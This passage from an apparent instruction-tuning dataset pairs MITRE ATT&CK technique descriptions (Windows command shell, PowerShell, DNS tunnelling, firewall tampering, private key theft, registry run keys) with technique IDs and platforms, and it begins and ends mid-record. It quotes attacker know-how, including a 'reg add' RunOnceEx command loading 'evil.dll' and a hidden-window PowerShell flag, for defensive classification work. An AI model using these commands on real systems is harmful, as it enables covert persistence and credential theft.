      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "answer": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Files and Directories (T1564.001);\nTechnique Hide Artifacts: Hidden Files and Directories (T1564.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Files and Directories (T1564.001);\nTechnique Hide Artifacts: Hidden Files and Directories (T1564.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify System Firewall (T1562.004);\nTechnique Impair Defenses: Disable or Modify System Firewall (T1562.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.",
      "answer": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify System Firewall (T1562.004);\nTechnique Impair Defenses: Disable or Modify System Firewall (T1562.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Unsecured Credentials: Private Keys (T1552.004);\nTechnique Unsecured Credentials: Private Keys (T1552.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "answer": "The provided description is related to MITRE technique Unsecured Credentials: Private Keys (T1552.004);\nTechnique Unsecured Credentials: Private Keys (T1552.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
